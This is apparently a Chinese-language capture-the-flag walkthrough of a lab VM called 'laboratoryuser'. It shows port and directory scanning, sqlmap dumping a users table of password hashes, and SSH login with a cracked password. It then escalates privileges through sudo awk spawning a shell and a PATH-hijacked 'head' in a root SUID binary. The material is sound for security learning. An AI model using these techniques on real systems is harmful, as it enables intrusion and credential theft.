# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-10 00:30 EDT
Nmap scan report for laboratoryuser (192.168.2.2)
Host is up (0.00029s latency).
MAC Address: 08:00:27:DD:5D:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (7 hosts up) scanned in 2.16 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.2.2 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-10 00:31 EDT
Nmap scan report for laboratoryuser (192.168.2.2)
Host is up (0.00034s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 63:9c:2e:57:91:af:1e:2e:25:ba:55:fd:ba:48:a8:60 (RSA)
|   256 d0:05:24:1d:a8:99:0e:d6:d1:e5:c5:5b:40:6a:b9:f9 (ECDSA)
|_  256 d8:4a:b8:86:9d:66:6d:7f:a4:cb:d0:73:a1:f4:b5:19 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Nebula Lexus Labs
MAC Address: 08:00:27:DD:5D:00 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 4.19 (97%), Linux 5.0 - 5.14 (97%), OpenWrt 21.02 (Linux 5.4) (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 6.0 (94%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.34 ms laboratoryuser (192.168.2.2)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.49 seconds
```

# 漏洞利用

目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.2.2 -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,jpg,png,zip,git,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php,jpg,png,zip,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/index.php            (Status: 200) [Size: 3479]
/img                  (Status: 301) [Size: 308] [--> http://192.168.2.2/img/]                                                             
/login                (Status: 301) [Size: 310] [--> http://192.168.2.2/login/]                                                           
/joinus               (Status: 301) [Size: 311] [--> http://192.168.2.2/joinus/]                                                          
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/server-status        (Status: 403) [Size: 276]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 276]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

发现了/joinus，目录扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.2.2/joinus -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,jpg,png,zip,git,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.2/joinus
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,zip,git,txt,html,php,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 1712]
/.php                 (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/.html                (Status: 403) [Size: 276]
/.php                 (Status: 403) [Size: 276]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 276]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

没扫出来，还是打开看一看吧

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.2.2/joinus/
<a href="application_form.pdf" target="_blank">here</a>
```

在application_form.pdf找到了：https://nebulalabs.org/meetings?user=admin&password=d46df
8e6a5627debf930f7b5c8f3b083在/login尝试登录

<img width="1303" height="586" alt="图片" src="https://github.com/user-attachments/assets/4e294074-fcfa-473a-bccc-5352463e6f92" />

发现这个页面可能存在sql注入

<img width="1304" height="520" alt="图片" src="https://github.com/user-attachments/assets/2258296a-23c2-43e5-a848-ac2ec412c2fe" />

用sqlmap尝试一下

```
┌──(kali㉿kali)-[~]
└─$ sqlmap -r sql.txt --dbs
available databases [2]:
[*] information_schema
[*] nebuladb
┌──(kali㉿kali)-[~]
└─$ sqlmap -r sql.txt -D nebuladb --tables
Database: nebuladb
[3 tables]
+----------+
| central  |
| centrals |
| users    |
+----------+
┌──(kali㉿kali)-[~]
└─$ sqlmap -r sql.txt -D nebuladb -T users --dump
Database: nebuladb                                                  
Table: users
[7 entries]
+----+----------+----------------------------------------------+-------------+
| id | is_admin | password                                     | username    |
+----+----------+----------------------------------------------+-------------+
| 1  | 1        | d46df8e6a5627debf930f7b5c8f3b083             | admin       |
| 2  | 0        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |
| 3  | 0        | 5f823f1ac7c9767c8d1efbf44158e0ea             | Frederick   |
| 3  | 0        | 4c6dda8a9d149332541e577b53e2a3ea             | Samuel      |
| 5  | 0        | 41ae0e6fbe90c08a63217fc964b12903             | Mary        |
| 6  | 0        | 5d8cdc88039d5fc021880f9af4f7c5c3             | hecolivares |
| 7  | 1        | c8c605999f3d8352d7bb792cf3fdb25b (999999999) | pmccentral  |
+----+----------+----------------------------------------------+-------------+
```

ssh登录

```
┌──(kali㉿kali)-[~]
└─$ ssh pmccentral@192.168.2.2                   
pmccentral@192.168.2.2's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 10 Apr 2026 06:22:43 AM UTC

  System load:  0.0               Processes:               124
  Usage of /:   57.9% of 9.75GB   Users logged in:         0
  Memory usage: 46%               IPv4 address for enp0s3: 192.168.2.2
  Swap usage:   0%

 * Ubuntu 20.04 LTS Focal Fossa has reached its end of standard support
   on 31 May 2025.

   For more details see:
   https://ubuntu.com/20-04

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

2 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 18 20:05:04 2023 from 192.168.193.186
pmccentral@laboratoryuser:~$ 
```

# 权限提升

```
pmccentral@laboratoryuser:~$ whoami;id;hostname;uname -a
pmccentral
uid=1001(pmccentral) gid=1001(pmccentral) groups=1001(pmccentral)
laboratoryuser
Linux laboratoryuser 5.4.0-169-generic #187-Ubuntu SMP Thu Nov 23 14:52:28 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
//pmccentral可以以laboratoryadmin身份执行awk命令
pmccentral@laboratoryuser:~$ sudo -l
Matching Defaults entries for pmccentral on laboratoryuser:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pmccentral may run the following commands on laboratoryuser:
    (laboratoryadmin) /usr/bin/awk
//wk内置system()函数可执行系统命令。用 sudo -u laboratoryadmin以高权限用户身份运行awk，在BEGIN块中调用 system("/bin/bash")即可生成一个laboratoryadmin的交互式 Shell。
pmccentral@laboratoryuser:~$ sudo -u laboratoryadmin awk 'BEGIN {system("/bin/bash")}'
laboratoryadmin@laboratoryuser:/home/pmccentral$ id
uid=1002(laboratoryadmin) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
laboratoryadmin@laboratoryuser:~$ sudo -l
[sudo] password for laboratoryadmin: 
Sorry, try again.
[sudo] password for laboratoryadmin: 
Sorry, try again.
[sudo] password for laboratoryadmin: 
sudo: 3 incorrect password attempts
//寻找所有设置了SUID位的可执行文件。SUID程序会以文件属主的权限运行，若属于root，则是潜在提权入口。
laboratoryadmin@laboratoryuser:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
/snap/snapd/20290/usr/lib/snapd/snap-confine
/home/laboratoryadmin/autoScripts/PMCEmployees
//属于root，并有SUID位
laboratoryadmin@laboratoryuser:~$ ls -la /home/laboratoryadmin/autoScripts/PMCEmployees
-rwsr-xr-x 1 root root 16792 Dec 17  2023 /home/laboratoryadmin/autoScripts/PMCEmployees                                                  
laboratoryadmin@laboratoryuser:~$ /home/laboratoryadmin/autoScripts/PMCEmployees
aren
Aarika
Abagael
Abagail
Abbe
Abbey
Abbi
Abbie
Abby
Abbye
Showing top 10 best employees of PMC company
//system()调用时没有指定head的绝对路径，它会在PATH环境变量中搜索名为head的程序
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setuid(0);
  printf("Showing top 10 best employees of PMC company");
  return system("head /home/pmccentral/documents/employees.txt");
}
laboratoryadmin@laboratoryuser:~/autoScripts$ ls -la
total 32
drwxr-xr-x 2 laboratoryadmin laboratoryadmin  4096 Dec 18  2023 .
drwx------ 8 laboratoryadmin laboratoryadmin  4096 Dec 18  2023 ..
-rwxrwxr-x 1 laboratoryadmin laboratoryadmin     8 Dec 18  2023 head
-rwsr-xr-x 1 root            root            16792 Dec 17  2023 PMCEmployees                                                              
laboratoryadmin@laboratoryuser:~/autoScripts$ cat head
bash -p
//在目录下创建一个恶意脚本，命名为head
laboratoryadmin@laboratoryuser:~/autoScripts$ echo '/usr/bin/bash -p' > head  
//修改PATH环境变量，将当前目录置于首位                
laboratoryadmin@laboratoryuser:~/autoScripts$ export PATH=/home/laboratoryadmin/autoScripts:$PATH
//程序内部执行system("head ...")时，会优先在/home/laboratoryadmin/autoScripts/head找到我们的恶意脚本，并以root权限执行它
laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees
bash: groups: command not found
Command 'lesspipe' is available in the following places
 * /bin/lesspipe
 * /usr/bin/lesspipe
The command could not be located because '/bin:/usr/bin' is not included in the PATH environment variable.
lesspipe: command not found
Command 'dircolors' is available in the following places
 * /bin/dircolors
 * /usr/bin/dircolors
The command could not be located because '/usr/bin:/bin' is not included in the PATH environment variable.
dircolors: command not found
root@laboratoryuser:~# /bin/id
uid=0(root) gid=1002(laboratoryadmin) groups=1002(laboratoryadmin)
```
